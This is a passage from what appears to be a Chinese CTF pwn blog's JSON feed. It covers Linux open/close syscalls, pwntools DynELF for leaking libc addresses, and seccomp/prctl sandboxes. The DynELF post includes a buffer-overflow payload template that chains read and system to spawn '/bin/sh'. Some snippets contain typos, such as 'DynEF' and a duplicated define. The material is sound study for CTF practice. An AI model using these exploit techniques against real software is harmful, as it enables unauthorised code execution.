data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;fcntl.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/types.h></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/stat.h></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">open</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> <span class=\"token operator\">*</span>path<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> oflags<span class=\"token punctuation\">,</span> <span class=\"token class-name\">mode_t</span> mode<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>在第一种调用方式上，加上了第三个参数 mode，主要是搭配 O_CREAT 使用，同样地，这个参数规定了属主、同组和其他人对文件的文件操作权限。</p>\n<h2 id=\"5close系统调用\"><a class=\"anchor\" href=\"#5close系统调用\">#</a> 5.close 系统调用</h2>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;unistd.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">close</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> flides<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>终止文件描述符 flides 与其对应的文件间的联系，文件描述符被释放，可重新使用。</p>\n",
            "tags": [
                "pwn",
                "二进制",
                "Linux"
            ]
        },
        {
            "id": "https://vvwwvv.cn/2023/08/29/pwn/%E4%B8%93%E6%A0%8F/DynELF/",
            "url": "https://vvwwvv.cn/2023/08/29/pwn/%E4%B8%93%E6%A0%8F/DynELF/",
            "title": "DynELF",
            "date_published": "2023-08-29T12:15:56.000Z",
            "content_html": "<h1 id=\"概述\"><a class=\"anchor\" href=\"#概述\">#</a> 概述</h1>\n<p>由于在 pwn 题中有时候不给 libc，那么需要我们自己通过泄露函数地址来获得 libc 的基地址，而往往 LibcSearcher 无法准确的得到 libc 版本，那么我们就需要利用 DynELF，这是 pwntools 在早期版本就提供了一个解决方案 ——DynELF 类；利用方式与 ret2libc 类似，都是泄露函数地址来计算得到 libc 基址，通俗地讲，DynELF 就是通过程序漏洞泄露出任意地址内容，结合 ELF 文件的结构特征获取对应版本文件并计算对比出目标符号在内存中的地址</p>\n<p>并且：<br />\nwrite 函数是最理想的，因为 write 函数的特点在于其输出完全由其参数 size 决定，只要目标地址可读，size 填多少就输出多少，不会受到诸如‘\\0’, ‘\\n’之类的字符影响；而 puts, printf 函数会受到诸如‘\\0’, ‘\\n’之类的字符影响，在对数据的读取和处理有一定的难度</p>\n<h1 id=\"使用方式\"><a class=\"anchor\" href=\"#使用方式\">#</a> 使用方式</h1>\n<p>首先需要构造一个函数</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>  <span class=\"token comment\">#addr 为想要获得的函数地址</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\tpayload_leak<span class=\"token operator\">=</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token string\">\"write_plt\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>main<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\tp<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload_leak<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\tfun_addr<span class=\"token operator\">=</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token keyword\">return</span> fun_addr</pre></td></tr></table></figure><p>然后需要实例化该函数（指向 ELF 文件的指针或者使用 ELF 类加载的目标文件至少提供一个作为可选参数）</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>d<span class=\"token operator\">=</span>DynELF<span class=\"token punctuation\">(</span>lead<span class=\"token punctuation\">,</span>pointer<span class=\"token operator\">=</span>pointer_into_ELF_file<span class=\"token punctuation\">,</span> elf<span class=\"token operator\">=</span>ELFObject<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>实例化举例</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>d<span class=\"token operator\">=</span>DynEF<span class=\"token punctuation\">(</span> leak<span class=\"token punctuation\">,</span> elf<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn'</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>接下来可以运用实例化对象来找到想要的地址（通过这个实例 d 的方法 lookup 来搜寻 libc 库函数）</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>system<span class=\"token operator\">=</span>d<span class=\"token punctuation\">.</span>lookup<span class=\"token punctuation\">(</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'libc'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>read<span class=\"token operator\">=</span>d<span class=\"token punctuation\">.</span>lookup<span class=\"token punctuation\">(</span><span class=\"token string\">'read'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'libc'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">#用 read 是因为程序里没有 '/bin/sh' 字符串时，还需要我们写入字符串，一般为 bbs 段内</span></pre></td></tr></table></figure><p>最后的 payload 为</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">140</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>read<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>elf<span class=\"token punctuation\">.</span>bss<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">'/bin/sh\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#顺序为先执行 read 再到 system</span></pre></td></tr></table></figure><p>需要查看 write 函数能不能在程序中实现任意地址的读取打印<br />\n可以时可以用 DynELF</p>\n<p>DynELF 泄露函数方法最方便的使用情况是程序中最好含有 write 函数等输出函数且可以多次反复调用，并且 DynELF 找的是字符串</p>\n<p>参考：<br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwODI3OTkwL2FydGljbGUvZGV0YWlscy84NjY4OTc2MA==\">https://blog.csdn.net/qq_40827990/article/details/86689760</span></p>\n",
            "tags": [
                "pwn",
                "二进制"
            ]
        },
        {
            "id": "https://vvwwvv.cn/2023/08/29/pwn/%E4%B8%93%E6%A0%8F/%E6%B2%99%E7%9B%92%E6%9C%BA%E5%88%B6/",
            "url": "https://vvwwvv.cn/2023/08/29/pwn/%E4%B8%93%E6%A0%8F/%E6%B2%99%E7%9B%92%E6%9C%BA%E5%88%B6/",
            "title": "沙盒机制",
            "date_published": "2023-08-29T12:15:56.000Z",
            "content_html": "<h1 id=\"概述\"><a class=\"anchor\" href=\"#概述\">#</a> 概述</h1>\n<p>沙盒机制也就是我们常说的沙箱，英文名 <code>sandbox</code> ，是计算机领域的虚拟技术，常见于安全方向。一般说来，我们会将不受信任的软件放在沙箱中运行，一旦该软件有恶意行为，则禁止该程序的进一步运行，不会对真实系统造成任何危害。</p>\n<p>在 ctf 比赛中，pwn 题中的沙盒一般都会限制 <code>execve</code>  的系统调用，这样一来 <code>one_gadget</code>  和 <code>system</code>  调用都不好使，只能采取 <code>open/read/write</code>  的组合方式来读取 flag。当然有些题目可能还会将上面三个系统调用砍掉一个，进一步限制我们获取到 flag.</p>\n<h1 id=\"1prctl函数调用\"><a class=\"anchor\" href=\"#1prctl函数调用\">#</a> 1.prctl 函数调用</h1>\n<p>prctl 是进程管理函数，沙箱规则通过 prctl 函数实现（也可以通过 seccomp 库函数实现），由它决定了哪些 <code>系统调用函数</code> 能被调用哪些不能被调用</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 函数原型</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/prctl.h></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">prctl</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> option<span class=\"token punctuation\">,</span> <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> arg2<span class=\"token punctuation\">,</span> <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> arg3<span class=\"token punctuation\">,</span> <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> arg4<span class=\"token punctuation\">,</span> <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> arg5<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>option 选项有很多，剩下的参数也由 option 确定，这里介绍两个主要的 option<br />\n <code>PR_SET_NO_NEW_PRIVS(38)</code>  和  <code>PR_SET_SECCOMP(22)</code></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">/* Get/set process seccomp mode */</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">PR_GET_SECCOMP</span>      <span class=\"token expression\"><span class=\"token number\">21</span></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">PR_GET_SECCOMP</span>     <span class=\"token expression\"><span class=\"token number\">22</span></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"6\"></td><td><pre> * 用 22 时一般只允许 read、write、exit、sigereturn 函数执行</pre></td></tr><tr><td data-num=\"7\"></td><td><pre> * If no_new_privs is set, then operations that grant new privileges (i.e.</pre></td></tr><tr><td data-num=\"8\"></td><td><pre> * execve) will either fail or not grant them.  This affects suid/sgid,</pre></td></tr><tr><td data-num=\"9\"></td><td><pre> * file capabilities, and LSMs.</pre></td></tr><tr><td data-num=\"10\"></td><td><pre> *</pre></td></tr><tr><td data-num=\"11\"></td><td><pre> * Operations that merely manipulate or drop existing privileges (setresuid,</pre></td></tr><tr><td data-num=\"12\"></td><td><pre> * capset, etc.) will still work.  Drop those privileges if you want them gone.</pre></td></tr><tr><td data-num=\"13\"></td><td><pre> *</pre></td></tr><tr><td data-num=\"14\"></td><td><pre> * Changing LSM security domain is considered a new privilege.  So, for example,</pre></td></tr><tr><td data-num=\"15\"></td><td><pre> * asking selinux for a specific new context (e.g. with runcon) will result</pre></td></tr><tr><td data-num=\"16\"></td><td><pre> * in execve returning -EPERM.</pre></td></tr><tr><td data-num=\"17\"></td><td><pre> *</pre></td></tr><tr><td data-num=\"18\"></td><td><pre> * See Documentation/userspace-api/no_new_privs.rst for more details.</pre></td></tr><tr><td data-num=\"19\"></td><td><pre> */</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">PR_SET_NO_NEW_PRIVS</span>    <span class=\"token expression\"><span class=\"token number\">38</span></span></span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">PR_GET_NO_NEW_PRIVS</span>    <span class=\"token expression\"><span class=\"token number\">39</span></span></span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token comment\">// 为 38 时一般禁用 execve</span></pre></td></tr></table></figure><p>1.option 为 22 的情况 ( <code>#define PR_GET_SECCOMP     22</code> )</p>\n<ul>\n<li><code>第二个参数为1</code> ，只允许调用 <code>read/write/_exit(not exit_group)/sigreturn</code>  这几个 <code>syscall(系统调用)</code> :  <code>prctl(22,1LL,&amp;V1)</code></li>\n<li>第二个参数为 2，则为过滤模式，其中对 syscall 的限制通过参数 3 的结构体来自定义过滤规则:  <code>prctl(22, 2LL, &amp;v1);</code> (第二个参数为 2 时，则会利用 <code>参数3</code>  的指向的 <code>sock_fprog结构体</code>  的成员指向的 <code>sock_filter</code>  定义的规则来进行过滤 <code>任意系统调用和系统调用参数</code> ，通过这种方式我们可以自己定义想要过滤的系统调用)</li>\n</ul>\n<p>2.option 为 38 的情况 ( <code>#define PR_SET_NO_NEW_PRIVS    38</code> )</p>\n<ul>\n<li><code>第二个参数设置为1</code> ，则禁用 execve 系统调用且可以通过 fork () 函数和 clone () 函数 <code>继承给子进程</code> :  <code>prctl(38, 1LL, 0LL, 0LL, 0LL);</code></li>\n<li><code>第二个参数设置为2</code> ，则为过滤模式，其中对 syscall 的限制通过参数 3 的结构体来自定义过滤规则</li>\n</ul>\n<h2 id=\"bpf过滤规则伯克利封装包过滤\"><a class=\"anchor\" href=\"#bpf过滤规则伯克利封装包过滤\">#</a> BPF 过滤规则（伯克利封装包过滤）</h2>\n<p>上面提到的 <code>PT_SET_SECCOMP</code>  这个参数，后面接到的第一个参数，就是它设置的模式，第三个参数，指向 <code>sock_fprog结构体</code> ，sock_fprog 结构体中，又有指向 <code>sock_filter结构体</code> 的指针 ( <code>struct sock_filter *filter; /*指向包含struct sock_filter的结构体数组指针*/</code> )，sock_filter 结构体这里，就是我们要设置 <code>规则</code> 的地方</p>\n<p>这里利用别人定义的 <code>sock_filter</code> :</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;fcntl.h></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;unistd.h></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;stddef.h></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;linux/seccomp.h></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;linux/filter.h></span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;sys/prctl.h></span>    </span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;linux/bpf.h></span>             <span class=\"token comment\">//off 和 imm 都是有符号类型，编码信息定义在内核头文件 linux/bpf.h</span></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;sys/types.h></span></span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token keyword\">struct</span> <span class=\"token class-name\">sock_filter</span> filter<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span>  <span class=\"token comment\">// 结构体数组</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>                <span class=\"token function\">BPF_STMT</span><span class=\"token punctuation\">(</span>BPF_LD<span class=\"token operator\">|</span>BPF_W<span class=\"token operator\">|</span>BPF_ABS<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>   <span class=\"token comment\">// 从第 0 个字节开始，传送 4 个字节</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>                <span class=\"token function\">BPF_JUMP</span><span class=\"token punctuation\">(</span>BPF_JMP<span class=\"token operator\">|</span>BPF_JEQ<span class=\"token punctuation\">,</span> <span class=\"token number\">59</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// 比较是否为 59（execve 的系统调用号），是就跳过下一行（进入到下面的异常处理），如果不是，就执行下一行，第三个参数表示执行正确的指令跳转，第四个参数表示执行错误的指令跳转</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>                <span class=\"token function\">BPF_JUMP</span><span class=\"token punctuation\">(</span>BPF_JMP<span class=\"token operator\">|</span>BPF_JGE<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token comment\">//      BPF_STMP(BPF_RET+BPF_K,SECCOMP_RET_KILL),</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token comment\">//        杀死一个进程</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token comment\">//        BPF_STMP(BPF_RET+BPF_K,SECCOMP_RET_TRACE),</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token comment\">//        父进程追踪子进程，具体没太搞清楚</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>                 <span class=\"token function\">BPF_STMT</span><span class=\"token punctuation\">(</span>BPF_RET<span class=\"token operator\">+</span>BPF_K<span class=\"token punctuation\">,</span>SECCOMP_RET_ERRNO<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token comment\">//        异常处理</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>                <span class=\"token function\">BPF_STMT</span><span class=\"token punctuation\">(</span>BPF_RET<span class=\"token operator\">+</span>BPF_K<span class=\"token punctuation\">,</span>SECCOMP_RET_ALLOW<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token comment\">//        这里表示系统调用如果正常，允许系统调用</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token keyword\">struct</span> <span class=\"token class-name\">sock_fprog</span> prog<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>                <span class=\"token punctuation\">.</span>len<span class=\"token operator\">=</span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>filter<span class=\"token punctuation\">)</span><span class=\"token operator\">/</span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>sock_filter<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>                <span class=\"token punctuation\">.</span>filter<span class=\"token operator\">=</span>filter<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        <span class=\"token function\">prctl</span><span class=\"token punctuation\">(</span>PR_SET_NO_NEW_PRIVS<span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token function\">prctl</span><span class=\"token punctuation\">(</span>PR_SET_SECCOMP<span class=\"token punctuation\">,</span>SECCOMP_MODE_FILTER<span class=\"token punctuation\">,</span><span class=\"token operator\">&amp;</span>prog<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 第一个参数是进行什么设置，第二个参数是设置的过滤模式，第三个参数是设置的过滤规则</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"123\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>设置了 sock_filter 结构体数组。这里为什么是一个结构体数组呢？</p>\n<pre><code>结构体数组：\n数组中的每个元素都是一个结构体\n</code></pre>\n<p>因为我们看到里面有 BPF_STMT 和 BPF_JMP 的宏定义，其实 BPF_STMT 和 BPF_JMP 都是条件编译后 <code>赋值</code> 的 sock_filter 结构体</p>\n<p>sock_filer 结构体:</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">struct</span> <span class=\"token class-name\">sock_filter</span> <span class=\"token punctuation\">&#123;</span>            <span class=\"token comment\">/* Filter block */</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    __u16 code<span class=\"token punctuation\">;</span>                 <span class=\"token comment\">/* Actual filter code,bpf 指令码</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    __u8  jt;                   /* Jump true */</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    __u8  jf<span class=\"token punctuation\">;</span>                   <span class=\"token comment\">/* Jump false */</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    __u32 k<span class=\"token punctuation\">;</span>                    <span class=\"token comment\">/* Generic multiuse field */</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">//seccomp-data 结构体记录当前正在进行 bpf 规则检查的系统调用信息</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">struct</span> <span class=\"token class-name\">seccomp_data</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">int</span> nr<span class=\"token punctuation\">;</span><span class=\"token comment\">// 系统调用号</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    __u32 arch<span class=\"token punctuation\">;</span><span class=\"token comment\">// 调用架构</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    __u64 instruction_pointer<span class=\"token punctuation\">;</span><span class=\"token comment\">//CPU 指令指针</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    __u64 argv<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 寄存器的值，x86 下是 ebx，exc,edx,edi,ebp;x64 下是 rdi,rsi,rdx,r10,r8,r9</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTDBnNG4tYmxvZy9wLzEyODM5MTcxLmh0bWw=\">https://www.cnblogs.com/L0g4n-blog/p/12839171.html</span></p>\n<h1 id=\"2seccomp库函数\"><a class=\"anchor\" href=\"#2seccomp库函数\">#</a> 2.seccomp 库函数</h1>\n<pre><code>SCMP_ACT_ALLOW(0x7fff0000U) 黑名单外的进程可以被执行（黑名单内的不能执行）\nSCMP_ACT_KILL( 0x00000000U) 白名单外的进程被杀死\n</code></pre>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>__int64 <span class=\"token function\">sandbox</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token comment\">// 两个重要的宏，SCMP_ACT_ALLOW (0x7fff0000U) SCMP_ACT_KILL ( 0x00000000U)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token comment\">//seccomp_init 初始化，参数为 0 表示白名单模式，即没有匹配到规则的系统调用都会杀死进程，默认不允许所有的 syscall</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token comment\">// 参数为 0x7fff0000U 则为黑名单模式，在名单里的会被杀死</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  v1 <span class=\"token operator\">=</span> <span class=\"token function\">seccomp_init</span><span class=\"token punctuation\">(</span><span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span>v1 <span class=\"token punctuation\">)</span>    <span class=\"token comment\">// 初始化失败，v1&lt;=0</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"seccomp error\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token comment\">//seccomp_rule_add 